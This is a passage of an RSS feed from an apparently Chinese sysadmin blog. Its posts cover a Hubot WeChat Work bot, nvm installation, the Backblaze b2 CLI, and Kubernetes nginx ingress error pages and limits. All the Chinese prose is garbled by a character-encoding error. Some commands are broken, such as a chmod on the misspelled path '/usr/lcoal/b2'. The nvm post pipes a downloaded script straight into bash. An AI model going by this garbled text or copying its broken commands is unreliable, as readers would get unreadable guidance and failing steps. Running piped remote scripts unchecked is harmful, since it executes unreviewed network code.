&lt;p&gt;å…¬å¸ç”¨çš„æ˜¯ä¼ä¸šå¾®ä¿¡ï¼Œä¹‹å‰ç”¨ç¾¤æœºå™¨äººå’Œ prometheus é›†æˆï¼Œå‘é€å„ç§å‘Šè­¦ä¿¡æ¯ï¼Œä½†æ˜¯ç¾¤æœºå™¨äººæ— æ³•æ¥æ”¶æ¶ˆæ¯ï¼›åŒæ—¶æˆ‘ä»¬æƒ³é›†æˆè¿›å»å¾ˆå¤šè‡ªå®šä¹‰å‘½ä»¤ï¼Œæ¯”å¦‚å‘é€æŒ‡ä»¤å°±å¼€å§‹ jenkins buildï¼Œå‘é€ ansible æŒ‡ä»¤æ‰§è¡Œï¼Œå‘é€æµé‡å›¾å°±è‡ªåŠ¨æŠŠæœºæˆ¿çš„æµé‡å›¾å‘è¿‡æ¥ï¼Œè¿™ä¸ªç¾¤æœºå™¨äººå°±ç”¨ä¸æˆäº†ã€‚æ‰€ä»¥å¿…é¡»å†ç›´æ¥ä¸€äº›ï¼Œæ„å»ºä¸€ä¸ªä¼ä¸šå¾®ä¿¡çš„åº”ç”¨ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ä¸€ä¼ä¸šå¾®ä¿¡å®‰è£…å‰å‡†å¤‡&#34;&gt;ä¸€ã€ä¼ä¸šå¾®ä¿¡å®‰è£…å‰å‡†å¤‡&lt;/h2&gt;
&lt;p&gt;å®‰è£…å‰éœ€è¦åœ¨ä¼ä¸šå¾®ä¿¡ä¸­æ‹¿åˆ°4ä¸ªä¿¡æ¯ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;WECHATWORK_CORP_ID&lt;/li&gt;
&lt;li&gt;WECHATWORK_APP_AGENT_ID&lt;/li&gt;
&lt;li&gt;WECHATWORK_APP_SECRET&lt;/li&gt;
&lt;li&gt;WECHATWORK_AES_KEY&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;é¦–å…ˆè”ç³»ä¼ä¸šå¾®ä¿¡ç®¡ç†å‘˜æ–°å¢ä¸€ä¸ªåº”ç”¨ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211222144935256&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211222-hubot_wechat/image-20211222144935256.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;åœ¨â€œç®¡ç†åå°-æˆ‘çš„ä¼ä¸šâ€ä¸­å¯ä»¥è·å¾—åœ°ä¸€ä¸ªä¿¡æ¯ï¼Œä¼ä¸š ID ä¿¡æ¯ï¼ŒCORP_ID  ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211222144654696&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211222-hubot_wechat/image-20211222144654696.png&#34;&gt;æ‹¿æ‹¿  åœ¨â€œç®¡ç†åå°-åº”ç”¨ç®¡ç†-ç‚¹å‡»æŸå…·ä½“åº”ç”¨-è¯¦æƒ…â€é¡µä¸­å¯ä»¥è·å¾—äºŒã€ä¸‰ä¸ªä¿¡æ¯ï¼Œ APP_AGENT_ID å’Œ APP_SECRET&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211222150424143&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211222-hubot_wechat/image-20211222150424143.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç¬¬å››ä¸ª AES_KEY å°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œæˆ‘ä»¬è¿›å…¥è¿™ä¸ªåº”ç”¨ï¼Œç‚¹å‡»é…ç½®çš„å›¾æ ‡ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211222151155307&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211222-hubot_wechat/image-20211222151155307.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åè¿›å…¥ï¼Œç‚¹å‡»å¯ç”¨ API æ¥æ”¶&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211222151325525&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211222-hubot_wechat/image-20211222151325525.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åè®¾ç½®ä¸€ä¸‹&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;url å¡«å†™ &lt;a href=&#34;https://hubot.rendoumi.com/wechatwork/webhook&#34;&gt;https://hubot.rendoumi.com/wechatwork/webhook&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Token ç‚¹éšæœºè·å–&lt;/li&gt;
&lt;li&gt;EncodingAESKey ç‚¹éšæœºè·å–ï¼Œè¿™å°±æ˜¯å…·ä½“çš„ AESKey äº†&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211222151552345&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211222-hubot_wechat/image-20211222151552345.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åç‚¹å‡»ä¿å­˜ï¼Œè¿™é‡Œå¿…ç„¶ä¼šå¤±è´¥ï¼æ²¡æœ‰å…³ç³»ï¼Œå› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰è£…hubotå‘¢ã€‚æˆ‘ä»¬æŠŠè¿™ä¸‰ä¸ªåœ°æ–¹å…ˆè®°å½•ä¸‹æ¥ï¼Œéšåå†æ¥ç‚¹å‡»ä¿å­˜ã€‚&lt;/p&gt;
&lt;h2 id=&#34;äºŒhubot-å®‰è£…å‰å‡†å¤‡&#34;&gt;äºŒã€Hubot å®‰è£…å‰å‡†å¤‡&lt;/h2&gt;
&lt;p&gt;1ã€æ³¨æ„ä¸Šé¢åœ°å€ï¼šURL åœ°å€æ˜¯ https ï¼Œç„¶å hubot çš„ç¼ºçœåœ°å€æ˜¯ http://xxx:8080 ï¼Œè¿™æ ·å¦‚æœå‰é¢æ²¡æœ‰è¯ä¹¦å¸è½½çš„è®¾å¤‡ï¼Œå°±å¾—æ­å»ºä¸€ä¸ªNginxï¼ˆhaproxyã€traefikï¼‰æ¥ä»£ç† https 443ç«¯å£åˆ°8080ã€‚&lt;/p&gt;
&lt;p&gt;2ã€Hubot æ˜¯æ”¯æŒ Coffeescript å’Œ nodejs çš„ï¼Œä»å®ƒçš„ Adapters ç½‘é¡µçœ‹&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://hubot.github.com/docs/adapters/development/&#34;&gt;https://hubot.github.com/docs/adapters/development/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;é‡Œé¢éƒ½æ˜¯ coffee å‘³çš„å•ç®­å¤´å‡½æ•°ï¼Œå¯¼è‡´ä¸å¤ªç†Ÿæ‚‰çš„å…«æˆ’ä»¥ä¸ºåœ¨ wechatwork moduleå¯¼å‡ºçš„æ—¶å€™ä¹Ÿåº”è¯¥ç”¨å•ç®­å¤´å‡½æ•°ï¼Œç»“æœå°±æ‚²å‰§äº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>nodejså¤šç‰ˆæœ¬çš„å®‰è£…ä¸ç®¡ç†</title>
      <link>https://rendoumi.com/posts/20211217-nodejs_nvm/</link>
      <pubDate>Fri, 17 Dec 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211217-nodejs_nvm/</guid>
      <description>&lt;p&gt;æœ€è¿‘åœ¨æ JavaScriptsï¼Œnodejsçš„ç‰ˆæœ¬æ»¡å¤©é£ï¼Œä¹‹å‰ç”¨çš„ nvm ç®¡ç†çš„æ–¹æ³•çªç„¶ä¸èƒ½ç”¨äº†ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œè®°å½•ä¸€ä¸‹ï¼Œæ¯”è¾ƒæ–°çš„ nvm çš„å®‰è£…ä½¿ç”¨æ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;ä¸‹è½½å®‰è£…ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; bash
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä»¥ä¸Šçš„è„šæœ¬å®‰è£…åˆ°åº•åšäº†ä»€ä¹ˆå‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;ä¸€ã€å®ƒ clone äº† nvm åˆ° $HOME/.nvmç›®å½•&lt;/p&gt;
&lt;p&gt;äºŒã€å®ƒåœ¨ .bashrc ä¸­æ·»åŠ äº†ä¸‰è¡Œ&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211217093956358&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211217-nodejs_nvm/image-20211217093956358.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;äº‹å®ä¸Šå®ƒæ˜¯æ ¹æ®å½“å‰çš„ bash é€‰æ‹©åœ¨ .bash_profileã€.zshrcã€.profileã€.bashrcä¸­çš„æŸä¸€ä¸ªè¿›è¡Œæ·»åŠ &lt;/p&gt;
&lt;p&gt;ç„¶åæˆ‘ä»¬é€€å‡ºç»ˆç«¯ï¼Œå¹¶é‡æ–°è¿›å…¥ï¼Œçœ‹çœ‹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nvm list
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nvm ls-remote
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åé€‰æ‹©æœ€æ–°çš„ç‰ˆæœ¬å®‰è£…ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nvm install v16.13.1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚æœæƒ³ä½¿ç”¨ä¸åŒç‰ˆæœ¬&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nvm use 14.0.0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è®¾ç½®ç¼ºçœç‰ˆæœ¬æˆ–è€…å–æ¶ˆ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nvm &lt;span class=&#34;nb&#34;&gt;alias&lt;/span&gt; defaut &amp;lt;your_nodejs_default_version&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nvm &lt;span class=&#34;nb&#34;&gt;alias&lt;/span&gt; default 14.0.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;node -v &lt;span class=&#34;c1&#34;&gt;# prints 14.0.0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å‚è€ƒåœ°å€ï¼šhttps://github.com/nvm-sh/nvm&lt;/p&gt;</description>
    </item>
    <item>
      <title>Backblazeç±»S3å…è´¹å…å¤‡æ¡ˆå¯¹è±¡å­˜å‚¨</title>
      <link>https://rendoumi.com/posts/20211208-backblaze_usage/</link>
      <pubDate>Wed, 08 Dec 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211208-backblaze_usage/</guid>
      <description>&lt;p&gt;S3 çš„æ¡¶å­˜å‚¨å¯ä»¥ç”¨ minio æ¥æ¨¡æ‹Ÿã€‚&lt;/p&gt;
&lt;p&gt;ç½‘ä¸Šæœ‰ä¸ª Backblaze çš„ç½‘ç«™ï¼Œæä¾› 10GB çš„å…è´¹ç©ºé—´ï¼Œä¸”å¦‚æœæ˜¯å…¬ç½‘è®¿é—®ï¼Œ1GBæµé‡æ˜¯å…è´¹çš„ï¼Œå¦‚æœå‰é¢å¥—äº† Cloudflare çš„CDNï¼Œé‚£åŸºæœ¬æ˜¯å…¨å…äº†ã€‚&lt;/p&gt;
&lt;p&gt;è¯´ä¸‹ä½¿ç”¨æ–¹å¼ï¼š&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå» &lt;a href=&#34;https://www.backblaze.com/&#34;&gt;https://www.backblaze.com/&lt;/a&gt; æ³¨å†Œä¸ªå¸å·ï¼š&lt;/p&gt;
&lt;p&gt;ç„¶åç›´æ¥å»ºä¸ªæ¡¶ï¼ˆCreate a Bucketï¼‰&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211208141419298&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211208-backblaze_usage/image-20211208141419298.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ¡¶æ–‡ä»¶ç±»å‹é€‰æ‹© publicï¼Œå¦åˆ™æ— æ³•å…¬ç½‘è®¿é—®ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211208141521449&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211208-backblaze_usage/image-20211208141521449.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶å gen å‡º master app key æ¥å¹¶è®°å½•å¥½ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211208142149530&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211208-backblaze_usage/image-20211208142149530.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;éšåæœ€å¤§çš„é—®é¢˜å°±æ¥äº†ï¼Œå¦‚æœä½ ç”¨å®ƒé¡µé¢è‡ªå¸¦çš„ä¸Šä¼ ä¸‹è½½å·¥å…·ï¼Œå½»åº•å®Œè›‹ï¼Œæ‹–è¿›å»çš„æ–‡ä»¶å¤¹ä¼šå˜æˆæ‰å¹³çš„ï¼Œå®Œå…¨ä¸§å¤±ç›®å½•ç»“æ„ã€‚&lt;/p&gt;
&lt;p&gt;å¿…é¡»è¦æ‰¾ä¸€ä¸ªå¥½ç”¨çš„ä¸Šä¼ å·¥å…·äº†ï¼Œæ¨è b2 ã€‚&lt;/p&gt;
&lt;p&gt;b2 å·¥å…·ä¸‹è½½ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Backblaze/B2_Command_Line_Tool&#34;&gt;https://github.com/Backblaze/B2_Command_Line_Tool&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹è½½åç›´æ¥æ”¹åä¸º b2 ï¼Œç„¶åæ”¾åˆ° /usr/local/bin ä¸­&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget -O /usr/local/bin/b2 https://github.com/Backblaze/B2_Command_Line_Tool/releases/download/v3.1.0/b2-linux
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod &lt;span class=&#34;m&#34;&gt;755&lt;/span&gt; /usr/lcoal/b2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿è¡Œä¸€ä¸‹ï¼Œæœ‰å¾ˆå¤šå‘½ä»¤å‚æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211208142026377&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211208-backblaze_usage/image-20211208142026377.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¯¦ç»†çš„ä½¿ç”¨æ–‡æ¡£ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://b2-command-line-tool.readthedocs.io/en/master/&#34;&gt;https://b2-command-line-tool.readthedocs.io/en/master/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å…ˆå»é…ç½®å¸å·ï¼Œè¾“å…¥applicationKeyIdå’ŒapplicationKey&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;b2 authorize-account
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå°±å¯ä»¥å¾€æ¡¶é‡Œä¼ ä¸œè¥¿äº†ï¼ŒæŠŠå½“å‰ç›®å½•ä¸‹çš„ä¸œè¥¿ä¼ åˆ° rendoumi è¿™ä¸ªæ¡¶é‡Œï¼Œå¹¶ä¸”ä¸è¦ä¼  .git ç›®å½•&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;b2 sync --excludeDirRegex .git . b2://rendoumi/ 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¥— Cloudflare å°±éšæ„äº†ã€‚full sslï¼Œå»ºä¸ª CNAME ä¸”ç”¨ Page rule åš url è½¬å‘å°±å¯ä»¥äº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>kubernetesä¸‹å®šåˆ¶æœåŠ¡å™¨503ä»¥åŠå…¶ä»–çš„403æ¶ˆæ¯</title>
      <link>https://rendoumi.com/posts/20211129-kubernetes_custom_503/</link>
      <pubDate>Mon, 29 Nov 2021 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211129-kubernetes_custom_503/</guid>
      <description>&lt;p&gt;kubernetesä¸‹å®šåˆ¶ http 50x ä»¥åŠ 40x æœåŠ¡å™¨è¿”å›ä¿¡æ¯çš„è¯ï¼Œå¦‚æœç”¨ Nginx åš ingressï¼Œå¤§å®¶ä¼šå¾ˆè‡ªç„¶æƒ³åˆ°ç›´æ¥ç”¨ nginx æ¥å®šåˆ¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;error_page   500 502 503 504  /50x.html;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;location&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;/50x.html {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;            root   /export/html;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        }&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·åšæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸º Nginx ä½œä¸º ingress æ¥ä½¿ç”¨ï¼Œå°±ä¸èƒ½è½åœ°ï¼Œåªèƒ½åšè½¬å‘ï¼›å¦‚æœä½ è½åœ°äº†ï¼Œè®¿é—®äº†æœ¬åœ°æ–‡ä»¶ï¼Œå°±è¿èƒŒäº†åˆè¡·ã€‚è€Œä¸”åœ¨ ingress çš„ pod ä¸Šæ”¾é¡µé¢ï¼Œä¼šå¯¼è‡´ ingress çš„é…ç½®é”™ä¹±ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆæ­£ç¡® 50x é‡å®šä½çš„æ–¹æ³•å¦‚ä¸‹ï¼šé¦–å…ˆå»ºç«‹ä¸€ä¸ª deploy å’Œå¯¹åº”çš„ svcï¼Œå°±æ˜¯å»ºç«‹ä¸€ä¸ª web æœåŠ¡å™¨ï¼Œèƒ½æä¾›æœåŠ¡è¿”å› 50x å’Œ 40x çš„å®šåˆ¶é¡µé¢ï¼›ç„¶ååœ¨ ingress&lt;/p&gt;
&lt;p&gt;å†…æŒ‡å®š custom-http-errors å’Œ default-backend æŒ‡å‘å®ƒå°±å¯ä»¥äº†ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ä¸€å»ºç«‹miniserveçš„deployå’Œsvc&#34;&gt;ä¸€ã€å»ºç«‹miniserveçš„deployå’Œsvc&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬é€‰ç”¨ rust çš„ miniserve ä½œä¸º web æœåŠ¡å™¨ï¼Œå‡†å¤‡å¥½å®šåˆ¶å¥½çš„ index.htmlï¼Œå†™ä¸ª Dockerfile&lt;/p&gt;
&lt;p&gt;ç½‘å€ï¼šhttps://github.com/svenstaro/miniserve&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;FROM alpine:3.12&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;RUN apk add --update bash &amp;amp;&amp;amp; rm -rf /var/cache/apk/*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;COPY . /data/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;RUN    rm -rf /data/Dockerfile&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;WORKDIR /data&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;EXPOSE 8080&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;CMD [&amp;#34;/data/miniserve&amp;#34;,&amp;#34;--index&amp;#34;,&amp;#34;index.html&amp;#34;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#CMD /bin/sh -c &amp;#34;while true; do echo hi; sleep 10; done&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½œå‡ºé•œåƒåæ¨é€åˆ°é˜¿é‡Œé•œåƒï¼š&lt;code&gt;registry.cn-shanghai.aliyuncs.com/rendoumi/miniserve:lastest&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>kubernetesä¸‹nginx ingressçš„é™åˆ¶</title>
      <link>https://rendoumi.com/posts/20211129-kubernetes_nginx_ingress_limit/</link>
      <pubDate>Mon, 29 Nov 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211129-kubernetes_nginx_ingress_limit/</guid>
      <description>&lt;p&gt;åœ¨ kubernetes ä¸­ï¼Œingress è´Ÿè´£è½¬å‘ã€èæ–­å’Œé™æµã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ä»¥ Nginx ingress ä¸ºä¾‹ï¼Œè®¨è®ºä¸€ä¸‹è¿™æ–¹é¢çš„é—®é¢˜ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ä¸€nginx-ingressé»‘ç™½åå•&#34;&gt;ä¸€ã€Nginx ingressé»‘ç™½åå•&lt;/h2&gt;
&lt;p&gt;è¿™ä¸ªå¾ˆç®€å•äº†ï¼Œä¸¢è¿›é»‘åå•æˆ–è€…ç™½åå•ï¼Œåœ¨å…¥å£å‰æ‹¦ä¸€åˆ€ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åªè¦åœ¨ annotations å£°æ˜å³å¯ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211129102114725&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211129-kubernetes_nginx_ingress_limit/image-20211129102114725.png&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;apiVersion&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;networking.k8s.io/v1beta1 &lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;kind&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Ingress &lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;metadata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;www-com-ingress &lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;annotations&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
